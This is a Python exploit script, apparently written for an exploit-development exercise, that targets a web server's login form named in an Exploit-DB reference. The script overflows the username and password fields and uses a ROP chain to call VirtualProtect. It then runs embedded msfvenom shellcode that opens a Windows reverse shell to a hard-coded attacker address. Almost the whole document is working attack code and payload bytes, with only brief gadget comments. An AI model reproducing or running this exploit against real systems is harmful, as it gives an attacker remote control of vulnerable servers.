# Vulnerable software - https://www.exploit-db.com/exploits/43145
#!/usr/bin/python
 
import socket,os,sys,struct


host = "192.168.1.103"
port = 80

#eip offset
crash  = "\x41" * 780

crash += struct.pack('<L', 0x1010BE73) #1010BE73 ret - stack pivot 
#for some reason, the stack pivot overwrites the next address on the stack, so I put some nops there to take care of that
rop = "\x90" * 4

rop += struct.pack('<L', 0x77bf5b62) #0x77bf5b62: push esp ; pop ecx ; ret  ;  (1 found)
rop += struct.pack('<L', 0x77b85e24) #0x77b85e24: mov eax, ecx ; ret  ;  (1 found)

rop += struct.pack('<L', 0x6ff821d5) #0x6ff821d5: add esp, 0x1C ; ret  ;  (1 found)

parameters = struct.pack('<L', 0x77E22341)    # kernel32.VirtualProtect() CALL 77E22341
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x40BCF080)    # pOldProtect (any writeable address)

rop2 = struct.pack('<L', 0x7382a498) # 0x7382a498: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)
rop2 += struct.pack('<L', 0x7382a498)

rop2 += struct.pack('<L', 0x77ef5b70) #0x77ef5b70: mov edx, ecx ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x73805ab6) #0x73805ab6: inc edx ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x6ff7e29a) #0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141) #padding for pop ebp
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)

rop2 += struct.pack('<L', 0x6ff63bdb) #0x6ff63bdb: mov dword [ecx], eax ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141) #padding for pop ebp

rop2 += struct.pack('<L', 0x73b1e071) #0x73b1e071: mov dword [edx], eax ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x73802a7d) #0x73802a7d: xor eax, eax ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x6ff7e29a) #add eax, 0x00000100 - gadget reuse x3
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)

rop2 += struct.pack('<L', 0x73805ab6) #inc edx ; ret - gadget reuse x4
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x73b1e071) # mov dword [edx], eax ; ret

rop2 += struct.pack('<L', 0x73802a7d) # xor eax, eax ; ret

rop2 += struct.pack('<L', 0x77bd6cdc) #0x77bd6cdc: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)

rop2 += struct.pack('<L', 0x73805ab6) #inc edx ; ret - gadget reuse x4
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x73b1e071) # mov dword [edx], eax ; ret

rop2 += struct.pack('<L', 0x77e3e990) #0x77e3e990: mov eax, ecx ; ret  ;  (found)

rop2 += struct.pack('<L', 0x41ac80db) #0x41ac80db: dec eax ; dec eax ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41ac80db)

rop2 += struct.pack('<L', 0x77f6184f) #0x77f6184f: xchg eax, esp ; ret  ;  (1 found )

nop = "\x90" * 4
nop2 = "\x90" * 200

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.196 LPORT=4455 -f py -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
buf =  b""
buf += b"\xbd\xa3\xe8\x28\x99\xd9\xc5\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x52\x31\x6f\x12\x03\x6f\x12\x83\x64\xec\xca"
buf += b"\x6c\x96\x05\x88\x8f\x66\xd6\xed\x06\x83\xe7\x2d\x7c"
buf += b"\xc0\x58\x9e\xf6\x84\x54\x55\x5a\x3c\xee\x1b\x73\x33"
buf += b"\x47\x91\xa5\x7a\x58\x8a\x96\x1d\xda\xd1\xca\xfd\xe3"
buf += b"\x19\x1f\xfc\x24\x47\xd2\xac\xfd\x03\x41\x40\x89\x5e"
buf += b"\x5a\xeb\xc1\x4f\xda\x08\x91\x6e\xcb\x9f\xa9\x28\xcb"
buf += b"\x1e\x7d\x41\x42\x38\x62\x6c\x1c\xb3\x50\x1a\x9f\x15"
buf += b"\xa9\xe3\x0c\x58\x05\x16\x4c\x9d\xa2\xc9\x3b\xd7\xd0"
buf += b"\x74\x3c\x2c\xaa\xa2\xc9\xb6\x0c\x20\x69\x12\xac\xe5"
buf += b"\xec\xd1\xa2\x42\x7a\xbd\xa6\x55\xaf\xb6\xd3\xde\x4e"
buf += b"\x18\x52\xa4\x74\xbc\x3e\x7e\x14\xe5\x9a\xd1\x29\xf5"
buf += b"\x44\x8d\x8f\x7e\x68\xda\xbd\xdd\xe5\x2f\x8c\xdd\xf5"
buf += b"\x27\x87\xae\xc7\xe8\x33\x38\x64\x60\x9a\xbf\x8b\x5b"
buf += b"\x5a\x2f\x72\x64\x9b\x66\xb1\x30\xcb\x10\x10\x39\x80"
buf += b"\xe0\x9d\xec\x07\xb0\x31\x5f\xe8\x60\xf2\x0f\x80\x6a"
buf += b"\xfd\x70\xb0\x95\xd7\x18\x5b\x6c\xb0\xe6\x34\x6f\x84"
buf += b"\x8f\x46\x6f\x15\x37\xce\x89\x7f\xa7\x86\x02\xe8\x5e"
buf += b"\x83\xd8\x89\x9f\x19\xa5\x8a\x14\xae\x5a\x44\xdd\xdb"
buf += b"\x48\x31\x2d\x96\x32\x94\x32\x0c\x5a\x7a\xa0\xcb\x9a"
buf += b"\xf5\xd9\x43\xcd\x52\x2f\x9a\x9b\x4e\x16\x34\xb9\x92"
buf += b"\xce\x7f\x79\x49\x33\x81\x80\x1c\x0f\xa5\x92\xd8\x90"
buf += b"\xe1\xc6\xb4\xc6\xbf\xb0\x72\xb1\x71\x6a\x2d\x6e\xd8"
buf += b"\xfa\xa8\x5c\xdb\x7c\xb5\x88\xad\x60\x04\x65\xe8\x9f"
buf += b"\xa9\xe1\xfc\xd8\xd7\x91\x03\x33\x5c\xa1\x49\x19\xf5"
buf += b"\x2a\x14\xc8\x47\x37\xa7\x27\x8b\x4e\x24\xcd\x74\xb5"
buf += b"\x34\xa4\x71\xf1\xf2\x55\x08\x6a\x97\x59\xbf\x8b\xb2"

filler = "C" * (10000 - len(crash)-len(parameters)-len(nop)-len(rop))
buffer = crash + rop + parameters + nop + rop2 + nop2 + buf + filler

evil =  "POST /login HTTP/1.1\r\n"
evil += "Host: 192.168.1.103\r\n"
evil += "User-Agent: Mozilla/5.0\r\n"
evil += "Connection: close\r\n"
evil += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
evil += "Accept-Language: en-us,en;q=0.5\r\n"
evil += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
evil += "Keep-Alive: 300\r\n"
evil += "Proxy-Connection: keep-alive\r\n"
evil += "Content-Type: application/x-www-form-urlencoded\r\n"
evil += "Content-Length: 17000\r\n\r\n"
evil += "username=" + buffer
evil += "&password=" + buffer # "\r\n"

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect((host,port))
print 'Sending evil buffer...'
s.send(evil)
print 'Payload Sent!'
s.close()
